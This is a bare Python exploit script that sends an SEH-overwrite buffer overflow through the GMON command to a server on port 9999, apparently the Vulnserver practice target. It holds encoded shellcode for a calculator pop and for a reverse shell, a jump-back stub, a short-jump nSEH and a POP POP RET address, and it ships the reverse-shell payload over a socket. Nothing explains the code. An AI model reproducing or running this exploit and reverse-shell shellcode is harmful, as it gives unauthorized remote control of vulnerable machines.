#!/usr/bin/python

import struct,socket

host = '192.168.1.29'
port = 9999

#calc (220 bytes)
calc = ("\xdb\xc0\xbd\x77\x93\x9b\xe9\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x31\x31\x6f\x18\x83\xef\xfc\x03\x6f\x63\x71\x6e\x15\x63\xf7"
"\x91\xe6\x73\x98\x18\x03\x42\x98\x7f\x47\xf4\x28\x0b\x05\xf8"
"\xc3\x59\xbe\x8b\xa6\x75\xb1\x3c\x0c\xa0\xfc\xbd\x3d\x90\x9f"
"\x3d\x3c\xc5\x7f\x7c\x8f\x18\x81\xb9\xf2\xd1\xd3\x12\x78\x47"
"\xc4\x17\x34\x54\x6f\x6b\xd8\xdc\x8c\x3b\xdb\xcd\x02\x30\x82"
"\xcd\xa5\x95\xbe\x47\xbe\xfa\xfb\x1e\x35\xc8\x70\xa1\x9f\x01"
"\x78\x0e\xde\xae\x8b\x4e\x26\x08\x74\x25\x5e\x6b\x09\x3e\xa5"
"\x16\xd5\xcb\x3e\xb0\x9e\x6c\x9b\x41\x72\xea\x68\x4d\x3f\x78"
"\x36\x51\xbe\xad\x4c\x6d\x4b\x50\x83\xe4\x0f\x77\x07\xad\xd4"
"\x16\x1e\x0b\xba\x27\x40\xf4\x63\x82\x0a\x18\x77\xbf\x50\x76"
"\x86\x4d\xef\x34\x88\x4d\xf0\x68\xe1\x7c\x7b\xe7\x76\x81\xae"
"\x4c\x88\xcb\xf3\xe4\x01\x92\x61\xb5\x4f\x25\x5c\xf9\x69\xa6"
"\x55\x81\x8d\xb6\x1f\x84\xca\x70\xf3\xf4\x43\x15\xf3\xab\x64"
"\x3c\x90\x2a\xf7\xdc\x79\xc9\x7f\x46\x86")

# reverse shell
reverse_shell = ("\xdb\xd0\xd9\x74\x24\xf4\x58\x2b\xc9\xbb\xb4\xdf\xa6\x95\xb1"
"\x52\x83\xe8\xfc\x31\x58\x13\x03\xec\xcc\x44\x60\xf0\x1b\x0a"
"\x8b\x08\xdc\x6b\x05\xed\xed\xab\x71\x66\x5d\x1c\xf1\x2a\x52"
"\xd7\x57\xde\xe1\x95\x7f\xd1\x42\x13\xa6\xdc\x53\x08\x9a\x7f"
"\xd0\x53\xcf\x5f\xe9\x9b\x02\x9e\x2e\xc1\xef\xf2\xe7\x8d\x42"
"\xe2\x8c\xd8\x5e\x89\xdf\xcd\xe6\x6e\x97\xec\xc7\x21\xa3\xb6"
"\xc7\xc0\x60\xc3\x41\xda\x65\xee\x18\x51\x5d\x84\x9a\xb3\xaf"
"\x65\x30\xfa\x1f\x94\x48\x3b\xa7\x47\x3f\x35\xdb\xfa\x38\x82"
"\xa1\x20\xcc\x10\x01\xa2\x76\xfc\xb3\x67\xe0\x77\xbf\xcc\x66"
"\xdf\xdc\xd3\xab\x54\xd8\x58\x4a\xba\x68\x1a\x69\x1e\x30\xf8"
"\x10\x07\x9c\xaf\x2d\x57\x7f\x0f\x88\x1c\x92\x44\xa1\x7f\xfb"
"\xa9\x88\x7f\xfb\xa5\x9b\x0c\xc9\x6a\x30\x9a\x61\xe2\x9e\x5d"
"\x85\xd9\x67\xf1\x78\xe2\x97\xd8\xbe\xb6\xc7\x72\x16\xb7\x83"
"\x82\x97\x62\x03\xd2\x37\xdd\xe4\x82\xf7\x8d\x8c\xc8\xf7\xf2"
"\xad\xf3\xdd\x9a\x44\x0e\xb6\x64\x30\x11\x4c\x0d\x43\x11\x41"
"\x91\xca\xf7\x0b\x39\x9b\xa0\xa3\xa0\x86\x3a\x55\x2c\x1d\x47"
"\x55\xa6\x92\xb8\x18\x4f\xde\xaa\xcd\xbf\x95\x90\x58\xbf\x03"
"\xbc\x07\x52\xc8\x3c\x41\x4f\x47\x6b\x06\xa1\x9e\xf9\xba\x98"
"\x08\x1f\x47\x7c\x72\x9b\x9c\xbd\x7d\x22\x50\xf9\x59\x34\xac"
"\x02\xe6\x60\x60\x55\xb0\xde\xc6\x0f\x72\x88\x90\xfc\xdc\x5c"
"\x64\xcf\xde\x1a\x69\x1a\xa9\xc2\xd8\xf3\xec\xfd\xd5\x93\xf8"
"\x86\x0b\x04\x06\x5d\x88\x34\x4d\xff\xb9\xdc\x08\x6a\xf8\x80"
"\xaa\x41\x3f\xbd\x28\x63\xc0\x3a\x30\x06\xc5\x07\xf6\xfb\xb7"
"\x18\x93\xfb\x64\x18\xb6")

nops = '\x90' * 30
jumpback = "\xe9\x98\xfe\xff\xff\x90\x90\x90"
nseh = '\xeb\xf6\x90\x90'
seh = struct.pack("<I",0x625010B4)

payload = 'A' * (3499 - len(nseh + jumpback + nops + reverse_shell)) # [*] Exact match at offset 3499
payload += nops
payload += reverse_shell
payload += jumpback
payload += nseh
payload += seh # POP POP RET 625010B4
payload += 'D' * (5000 - len(payload))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.recv(10000)
sock.send('GMON /.:/' + payload + '\r\n')
sock.recv(10000)
sock.close()